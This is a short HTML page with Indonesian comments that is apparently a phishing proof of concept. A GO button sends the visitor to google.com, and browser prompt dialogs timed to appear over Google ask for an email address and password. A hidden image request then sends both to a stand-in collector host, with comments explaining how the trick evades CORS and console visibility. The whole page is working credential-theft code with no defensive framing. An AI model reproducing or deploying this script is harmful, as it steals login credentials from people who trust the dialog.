<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Home</title>
<style>
  body {
    margin: 0; height: 100vh;
    display: flex; align-items: center; justify-content: center;
    font-family: system-ui, sans-serif;
  }
  #go {
    font-size: 20px; padding: 12px 48px;
    border: 2px solid #333; border-radius: 8px; cursor: pointer;
  }
</style>
</head>
<body>

<button id="go">GO</button>

<script>
document.getElementById("go").addEventListener("click", function () {
  // navigasi dimulai sekarang...
  window.location.href = "https://www.google.com";

  // ...tapi dialog di-schedule SETELAH redirect, biar muncul nimpa di google.com
  //    (butuh window timing: dialog jalan ketika dokumen lama masih pending)
  setTimeout(askCreds, 800);
});

function askCreds() {
  // prompt() = dialog bawaan browser, satu field input
  var email = prompt("google.com\n\nSign in to continue\n\nEmail:", "");

  if (email === null) return; // user klik Cancel

  var pass = prompt("google.com\n\nPassword for " + email + ":", "");
  if (pass === null) return;

  // exfil — request gambar bebas CORS & tidak kelihatan di console
  if (email && pass) {
    new Image().src = "https://kolektor-lu.example/log?u=" +
      encodeURIComponent(email) + "&p=" + encodeURIComponent(pass);
  }
}
</script>

</body>
</html>
